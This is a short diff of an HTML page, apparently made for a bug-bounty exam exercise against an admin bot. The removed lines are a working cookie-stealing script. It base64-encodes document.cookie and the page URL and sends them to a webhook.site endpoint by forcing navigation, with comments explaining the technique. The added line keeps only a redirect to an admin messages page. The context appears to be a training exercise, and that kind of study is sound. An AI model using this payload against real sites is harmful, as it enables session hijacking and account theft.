@@ -2,20 +2,7 @@
 <html>
 <body>
     <script>
-        // 1. Try to grab the cookie
-        var c = document.cookie ? btoa(document.cookie) : 'no_cookies';
-        
-        // 2. Try to grab the current URL (to see where the bot is)
-        var l = btoa(window.location.href);
-
-        // 3. FORCE the bot to navigate to your webhook with the data
-        // This is much more reliable than fetch() because it's a top-level navigation
-        window.location.href = "https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4/?data=" + c + "&loc=" + l;
-
-        // 4. Backup: Redirect to the admin message after 2 seconds if the above fails
-        setTimeout(function() {
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e37c20bee6d6b7c662cdec";
-        }, 2000);
-    </script>
+  window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages/69e37c20bee6d6b7c662cdec";
+</script>
 </body>
 </html>
